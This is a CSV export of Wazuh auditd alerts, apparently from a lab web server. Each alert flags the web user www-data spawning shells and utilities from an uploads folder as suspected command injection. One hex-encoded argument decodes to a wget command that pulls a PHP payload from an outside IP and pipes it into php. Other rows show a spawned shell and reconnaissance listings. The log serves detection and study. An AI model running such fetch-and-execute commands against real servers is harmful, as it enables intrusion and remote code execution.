_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.audit.syscall,_source.data.audit.gid,_source.data.audit.fsgid,_source.data.audit.session,_source.data.audit.pid,_source.data.audit.suid,_source.data.audit.type,_source.data.audit.uid,_source.data.audit.egid,_source.data.audit.exe,_source.data.audit.file.inode,_source.data.audit.file.mode,_source.data.audit.file.name,_source.data.audit.sgid,_source.data.audit.id,_source.data.audit.key,_source.data.audit.auid,_source.data.audit.execve.a1,_source.data.audit.execve.a2,_source.data.audit.execve.a0,_source.data.audit.euid,_source.data.audit.command,_source.data.audit.ppid,_source.data.audit.fsuid,_source.data.audit.exit,_source.data.audit.cwd,_source.data.audit.success,_source.data.audit.tty,_source.data.audit.arch,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.description,_source.rule.groups,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.rule.id,_source.decoder.parent,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,sort,_source.rule.hipaa,_source.rule.pci_dss,_source.rule.tsc,_source.rule.nist_800_53,_source.rule.gdpr,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.srcuser,_source.data.uid,_source.data.dstuser,_source.rule.gpg13,_source.data.audit.execve.a3,_source.syscheck.uname_after,_source.syscheck.mtime_after,_source.syscheck.size_after,_source.syscheck.gid_after,_source.syscheck.mode,_source.syscheck.path,_source.syscheck.sha1_after,_source.syscheck.gname_after,_source.syscheck.uid_after,_source.syscheck.perm_after,_source.syscheck.event,_source.syscheck.md5_after,_source.syscheck.sha256_after,_source.syscheck.inode_after,_source.data.audit.execve.a4,_source.data.audit.execve.a5,_source.data.audit.execve.a6,_source.data.audit.execve.a7,_source.syscheck.size_before,_source.syscheck.md5_before,_source.syscheck.sha256_before,_source.syscheck.changed_attributes,_source.syscheck.sha1_before,_source.data.euid,_source.data.tty,_source.data.pwd,_source.data.command,_source.decoder.ftscomment,_source.data.extra_data
wazuh-alerts-4.x-2026.07.31,xnr0tp8BC43qgJRl21Lm,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2958,33,SYSCALL,33,33,/usr/bin/ps,395752,0100755,/usr/bin/ps,33,270,www_data_exec,4294967295,aux, ,ps,33,ps,2957,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,11,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ps"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785480919.582:270): arch=c000003e syscall=59 success=yes exit=0 a0=5c9f1798b650 a1=5c9f1798b5b0 a2=5c9f1798b5c8 a3=8 items=2 ppid=2957 pid=2958 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ps"" exe=""/usr/bin/ps"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785480919.582:270): argc=2 a0=""ps"" a1=""aux"" type=CWD msg=audit(1785480919.582:270): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785480919.582:270): item=0 name=""/usr/bin/ps"" inode=395752 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785480919.582:270): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785480919.582:270): proctitle=707300617578",log,"Jul 31, 2026 @ 13:55:20.442",/var/log/audit/audit.log,1785480920.31738,"Jul 31, 2026 @ 13:55:20.442",[1785480920442], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,x3r2tp8BC43qgJRlJFK-,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2964,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,271,www_data_exec,4294967295,-c,--,sh,33,sh,1724,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,12,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481000.632:271): arch=c000003e syscall=59 success=yes exit=0 a0=73effeddb799 a1=7ffe9c45b530 a2=7ffe9c45e430 a3=8 items=2 ppid=1724 pid=2964 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481000.632:271): argc=4 a0=""sh"" a1=""-c"" a2=""--"" a3=6C7320323E2631 type=CWD msg=audit(1785481000.632:271): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481000.632:271): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481000.632:271): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481000.632:271): proctitle=7368002D63002D2D006C7320323E2631",log,"Jul 31, 2026 @ 13:56:42.507",/var/log/audit/audit.log,1785481002.33713,"Jul 31, 2026 @ 13:56:42.507",[1785481002507], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,yHr2tp8BC43qgJRlJFK-,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2965,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,272,www_data_exec,4294967295, , ,ls,33,ls,2964,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,13,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481000.633:272): arch=c000003e syscall=59 success=yes exit=0 a0=6056c4394600 a1=6056c4394568 a2=6056c4394578 a3=8 items=2 ppid=2964 pid=2965 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481000.633:272): argc=1 a0=""ls"" type=CWD msg=audit(1785481000.633:272): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481000.633:272): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481000.633:272): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481000.633:272): proctitle=""ls""",log,"Jul 31, 2026 @ 13:56:42.510",/var/log/audit/audit.log,1785481002.35748,"Jul 31, 2026 @ 13:56:42.510",[1785481002510], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,0Hr8tp8BC43qgJRlXFK5,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2984,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,277,www_data_exec,4294967295,-c,--,sh,33,sh,1723,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,1,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481409.304:277): arch=c000003e syscall=59 success=yes exit=0 a0=73effeddb799 a1=7ffe9c45b530 a2=7ffe9c45e430 a3=8 items=2 ppid=1723 pid=2984 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481409.304:277): argc=4 a0=""sh"" a1=""-c"" a2=""--"" a3=77676574202D714F2D20687474703A2F2F3139322E3136382E34332E3131312F7061796C6F61642E706870207C20706870202620323E2631 type=CWD msg=audit(1785481409.304:277): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481409.304:277): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481409.304:277): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481409.304:277): proctitle=7368002D63002D2D0077676574202D714F2D20687474703A2F2F3139322E3136382E34332E3131312F7061796C6F61642E706870207C20706870202620323E2631",log,"Jul 31, 2026 @ 14:03:31.044",/var/log/audit/audit.log,1785481411.37725,"Jul 31, 2026 @ 14:03:31.044",[1785481411044], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,0nr8tp8BC43qgJRlXFK7,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2986,33,SYSCALL,33,33,/usr/bin/php8, , , ,33,278,www_data_exec,4294967295, , , ,33,php,2984,33,0, ,yes,(none),c000003e,3,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""php"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481409.306:278): arch=c000003e syscall=59 success=yes exit=0 a0=5b130cf39908 a1=5b130cf39870 a2=5b130cf39880 a3=210 items=2 ppid=2984 pid=2986 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""php"" exe=""/usr/bin/php8.5"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data""",log,"Jul 31, 2026 @ 14:03:31.046",/var/log/audit/audit.log,1785481411.41111,"Jul 31, 2026 @ 14:03:31.046",[1785481411046], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,0Xr8tp8BC43qgJRlXFK7,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2985,33,SYSCALL,33,33,/usr/bin/wget, , , ,33,279,www_data_exec,4294967295, , , ,33,wget,2984,33,0, ,yes,(none),c000003e,2,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""wget"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481409.306:279): arch=c000003e syscall=59 success=yes exit=0 a0=5b130cf39910 a1=5b130cf39868 a2=5b130cf39888 a3=20 items=2 ppid=2984 pid=2985 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""wget"" exe=""/usr/bin/wget"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data""",log,"Jul 31, 2026 @ 14:03:31.047",/var/log/audit/audit.log,1785481411.39956,"Jul 31, 2026 @ 14:03:31.047",[1785481411047], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,03r8tp8BC43qgJRleFIY,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2987,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,280,www_data_exec,4294967295,-c, ,sh,33,sh,2986,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,4,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481423.967:280): arch=c000003e syscall=59 success=yes exit=0 a0=62c7a301773a a1=7ffc49654220 a2=62c7c80f4010 a3=8 items=2 ppid=2986 pid=2987 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481423.967:280): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F736820 type=CWD msg=audit(1785481423.967:280): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481423.967:280): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481423.967:280): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481423.967:280): proctitle=7368002D63002F62696E2F736820",log,"Jul 31, 2026 @ 14:03:44.766",/var/log/audit/audit.log,1785481424.42266,"Jul 31, 2026 @ 14:03:44.766",[1785481424766], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,1Hr8tp8BC43qgJRleFIY,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2988,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,281,www_data_exec,4294967295, , ,/bin/sh,33,sh,2987,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,5,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481423.969:281): arch=c000003e syscall=59 success=yes exit=0 a0=5ccccba52520 a1=5ccccba52540 a2=5ccccba52550 a3=8 items=2 ppid=2987 pid=2988 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481423.969:281): argc=1 a0=""/bin/sh"" type=CWD msg=audit(1785481423.969:281): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481423.969:281): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481423.969:281): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481423.969:281): proctitle=""/bin/sh""",log,"Jul 31, 2026 @ 14:03:44.817",/var/log/audit/audit.log,1785481424.44271,"Jul 31, 2026 @ 14:03:44.817",[1785481424817], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,1Xr8tp8BC43qgJRlk1LQ,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,2989,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,282,www_data_exec,4294967295, , ,ls,33,ls,2988,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,6,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481426.810:282): arch=c000003e syscall=59 success=yes exit=0 a0=581eff8ce5c8 a1=581eff8ce530 a2=581eff8ce540 a3=8 items=2 ppid=2988 pid=2989 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481426.810:282): argc=1 a0=""ls"" type=CWD msg=audit(1785481426.810:282): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481426.810:282): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481426.810:282): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481426.810:282): proctitle=""ls""",log,"Jul 31, 2026 @ 14:03:48.868",/var/log/audit/audit.log,1785481428.46219,"Jul 31, 2026 @ 14:03:48.868",[1785481428868], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,1nr9tp8BC43qgJRla1KK,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3000,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,283,www_data_exec,4294967295,-la,/etc/bash.bashrc,ls,33,ls,2988,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,7,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481486.087:283): arch=c000003e syscall=59 success=yes exit=0 a0=581eff8ce678 a1=581eff8ce5d0 a2=581eff8ce5f0 a3=8 items=2 ppid=2988 pid=3000 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481486.087:283): argc=3 a0=""ls"" a1=""-la"" a2=""/etc/bash.bashrc"" type=CWD msg=audit(1785481486.087:283): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481486.087:283): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481486.087:283): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481486.087:283): proctitle=6C73002D6C61002F6574632F626173682E626173687263",log,"Jul 31, 2026 @ 14:04:46.613",/var/log/audit/audit.log,1785481486.48196,"Jul 31, 2026 @ 14:04:46.613",[1785481486613], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,2Xr9tp8BC43qgJRl9FJo,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3002,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,284,www_data_exec,4294967295,-la,/etc/profile,ls,33,ls,2988,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,8,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785481517.553:284): arch=c000003e syscall=59 success=yes exit=0 a0=581eff8ce668 a1=581eff8ce5c0 a2=581eff8ce5e0 a3=8 items=2 ppid=2988 pid=3002 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785481517.553:284): argc=3 a0=""ls"" a1=""-la"" a2=""/etc/profile"" type=CWD msg=audit(1785481517.553:284): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785481517.553:284): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785481517.553:284): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785481517.553:284): proctitle=6C73002D6C61002F6574632F70726F66696C65",log,"Jul 31, 2026 @ 14:05:18.808",/var/log/audit/audit.log,1785481518.50301,"Jul 31, 2026 @ 14:05:18.808",[1785481518808], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
